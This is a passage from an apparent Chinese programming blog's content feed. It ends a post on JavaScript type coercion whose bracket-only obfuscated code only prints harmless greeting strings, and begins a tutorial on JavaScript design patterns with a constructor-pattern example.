punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "I love you!"</span><span class="token keyword">var</span> s2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'"'</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "我爱你"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="在线转换"><a href="#在线转换" class="headerlink" title="在线转换"></a>在线转换</h3><p>这里放一个在线转换的网站： <a href="https://knightyun.github.io/magic-expression/"><em>点我在线转换</em></a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 类型转换 表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 经典设计模式</title>
      <link href="/2024/09/27/javascript/javascript-jing-dian-she-ji-mo-shi/"/>
      <url>/2024/09/27/javascript/javascript-jing-dian-she-ji-mo-shi/</url>
      
        <content type="html"><![CDATA[<p>设计模式（<strong>Design Pattern</strong>）是一套被反复使用的代码设计经验总结，一个模式可以是一套可复用的方案，或者一个解决某一类问题的模板；使用固定的模式（解决方式）解决软件开发中的某些问题，利于代码的可理解性与可靠性，比如，比起设计一套标新立异的房屋结构，沿用大部分的现有设计结构更容易取得大部分人的信任与接受；下面是一些应用于 JavaScript 中的常用设计模式，以及以 JavaScript 实现的经典设计模式，包含示例与说明；</p><h2 id="构造器模式"><a href="#构造器模式" class="headerlink" title="构造器模式"></a>构造器模式</h2><p>在构造器模式中，通过声明构造器函数，再使用 <code>new</code> 关键字可获取一个新实例对象；构造函数可以接收参数，并在实例化时传参赋值，也可以在构造函数的 <code>prototype</code> 中添加公共属性或方法，使得所有实例对象都能访问；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'Human'</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">getName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">getType</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> knight <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'Knight'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>knight<span class="token punctuation">)</span><span class="token punctuation">;</span><span 